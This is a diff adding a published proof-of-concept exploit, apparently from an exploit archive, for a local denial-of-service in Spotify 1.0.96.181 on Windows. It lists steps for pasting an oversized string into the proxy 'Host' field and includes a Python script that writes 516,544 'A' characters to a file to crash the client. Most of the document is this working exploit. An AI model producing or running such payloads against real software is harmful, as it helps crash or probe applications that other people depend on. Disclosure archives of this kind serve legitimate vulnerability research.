@@ -1,0 +1,27 @@
+# Exploit Title: Spotify 1.0.96.181 - "Proxy configuration"  Denial of Service (PoC)
+# Discovery by: Aaron V. Hernandez
+# Discovery Date: 2019-01-15
+# Vendor Homepage: https://www.spotify.com
+# Software Link: https://www.spotify.com/mx/download/windows/
+# Tested Version: 1.0.96.181
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Home x64
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python Spotify_1.0.96.181.py
+# 2.- Open Spotify_1.0.96.181.txt and copy content to clipboard
+# 3.- Open Spotify.exe
+# 4.- Clic "Configuracion"
+# 5.- Select HTTP
+# 6.- Paste ClipBoard on "Host"
+# 7.- Clic "Actualizar proxy"
+# 8.- Type any user and password
+# 9.- "Iniciar sesion"
+# 10.- Crashed
+
+# !/usr/bin/env python
+
+buffer = "\x41" * 516544
+f = open("Spotify_1.0.96.181.txt", "w")
+f.write(buffer)
+f.close()
